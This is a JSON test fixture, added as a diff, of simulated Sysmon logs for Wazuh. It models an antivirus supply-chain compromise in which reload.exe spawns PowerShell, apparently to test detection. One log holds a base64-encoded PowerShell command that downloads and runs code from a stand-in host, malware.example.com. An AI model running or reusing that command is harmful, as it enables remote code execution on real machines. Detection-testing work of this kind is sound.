@@ -1,0 +1,215 @@
+{
+  "_metadata": {
+    "attack_id": "T1195.002",
+    "variation": "010",
+    "name": "eScan Supply Chain Attack",
+    "description": "Simulates eScan AV supply chain compromise - malicious reload.exe spawning PowerShell",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "initial-access",
+    "format": "wazuh-native",
+    "format_version": "1.0",
+    "references": [
+      "https://thehackernews.com/2026/02/escan-antivirus-update-servers.html"
+    ]
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Malicious reload.exe execution",
+      "sequence": 1,
+      "timestamp": "2026-02-02T21:00:00.000Z",
+      "log": {
+        "timestamp": "2026-02-02T21:00:00.000+0000",
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100900",
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706900000.100001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "_fomorian_test": true,
+        "_fomorian_batch": "intel-digest-20260202",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-02T21:00:00.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-02 21:00:00.000",
+              "processGuid": "{12345678-1234-1234-1234-100000000001}",
+              "processId": "4521",
+              "image": "C:\\Program Files (x86)\\escan\\reload.exe",
+              "commandLine": "\"C:\\Program Files (x86)\\escan\\reload.exe\" /update",
+              "currentDirectory": "C:\\Program Files (x86)\\escan\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "logonGuid": "{12345678-0000-0000-0000-000000000000}",
+              "logonId": "0x3e7",
+              "integrityLevel": "System",
+              "hashes": "SHA256=8F2FE9DC184BA209F78D1B81F87F7D39F0D260B8D6DC1F7AF9F256071D8C9FE0",
+              "parentProcessGuid": "{12345678-1234-1234-1234-000000000001}",
+              "parentProcessId": "788",
+              "parentImage": "C:\\Windows\\System32\\services.exe",
+              "parentCommandLine": "C:\\Windows\\system32\\services.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - reload.exe spawning PowerShell (detection trigger)",
+      "sequence": 2,
+      "timestamp": "2026-02-02T21:00:05.000Z",
+      "log": {
+        "timestamp": "2026-02-02T21:00:05.000+0000",
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100900",
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706900005.100002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "_fomorian_test": true,
+        "_fomorian_batch": "intel-digest-20260202",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-02T21:00:05.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-02 21:00:05.000",
+              "processGuid": "{12345678-1234-1234-1234-100000000002}",
+              "processId": "5832",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAaABlAGwAbAAnACkA",
+              "currentDirectory": "C:\\Program Files (x86)\\escan\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "logonGuid": "{12345678-0000-0000-0000-000000000000}",
+              "logonId": "0x3e7",
+              "integrityLevel": "System",
+              "hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+              "parentProcessGuid": "{12345678-1234-1234-1234-100000000001}",
+              "parentProcessId": "4521",
+              "parentImage": "C:\\Program Files (x86)\\escan\\reload.exe",
+              "parentCommandLine": "\"C:\\Program Files (x86)\\escan\\reload.exe\" /update"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - CONSCTLX.exe malicious payload",
+      "sequence": 3,
+      "timestamp": "2026-02-02T21:00:10.000Z",
+      "log": {
+        "timestamp": "2026-02-02T21:00:10.000+0000",
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100900",
+          "firedtimes": 3,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706900010.100003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "_fomorian_test": true,
+        "_fomorian_batch": "intel-digest-20260202",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-02T21:00:10.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-02 21:00:10.000",
+              "processGuid": "{12345678-1234-1234-1234-100000000003}",
+              "processId": "6144",
+              "image": "C:\\Users\\Public\\CONSCTLX.exe",
+              "commandLine": "C:\\Users\\Public\\CONSCTLX.exe",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "logonGuid": "{12345678-0000-0000-0000-000000000000}",
+              "logonId": "0x3e7",
+              "integrityLevel": "System",
+              "hashes": "SHA256=BEC369597633EAC7CC27A698288E4AE8D12BDD9B01946E73A28E1423B17252B1",
+              "parentProcessGuid": "{12345678-1234-1234-1234-100000000002}",
+              "parentProcessId": "5832",
+              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "parentCommandLine": "powershell.exe -ep bypass -enc ..."
+            }
+          }
+        }
+      }
+    }
+  ]
+}
